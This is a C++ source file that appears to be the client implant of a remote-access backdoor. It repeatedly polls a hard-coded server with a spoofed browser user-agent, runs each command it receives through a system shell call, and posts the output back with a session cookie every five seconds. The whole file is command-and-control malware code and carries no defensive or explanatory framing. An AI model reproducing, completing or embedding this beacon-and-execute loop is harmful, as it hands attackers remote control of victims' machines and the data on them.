#include "ServerConnection.h"

std::string ServerConnection::_serverAddress = SERVER_ADDRESS;

// This function extract sessionID cookie from Set-Cookie header
std::string ServerConnection::extractSessionId(http::Response request)
{
    for (auto &header : request.headers)
    {
        std::size_t pos = header.find("sessionId=");
        if (pos < header.size())
        {
            return header.substr(pos + 10);
        }
    }
    return std::string();
}

// This function parse required data from server request
ServerConnection::Request* ServerConnection::parsingRequest(http::Response request)
{
    Request* requestSt = new Request();

    requestSt->sessionId = this->extractSessionId(request);  // Extracting Set-Cookie for responding
    requestSt->command = std::string(request.body.begin(), request.body.end());

    return requestSt;
}

// This function generate response according to server request
ServerConnection::Response ServerConnection::handleRequest(ServerConnection::Request* request)
{
    Response responseSt;
    responseSt.sessionId = request->sessionId;
    responseSt.content = System::runCommand(request->command);

    delete request;

    return responseSt;
}

// This function receivr and handle server requests
ConnectionHandler* ServerConnection::run(void)
{
    try
    {
        while (true)
        {
            http::Request request(ServerConnection::_serverAddress);
            http::Response response = request.send("GET", "", { "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" });
            Request* requestSt = this->parsingRequest(response);
            if (requestSt)
            {
                Response responseSt = this->handleRequest(requestSt);
                response = request.send("POST", responseSt.content, { "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)", "Cookie: sessionID=" + responseSt.sessionId });
                Log::log("Responed Successfuly.");
            }
            else
            {
                Log::log("Unknown Command Type -> No Responding");
            }
            
            Sleep(5000);
        }
    }
    catch (...)
    {
        Log::log("Conection with Server Failed.");
        return nullptr;
    }
}
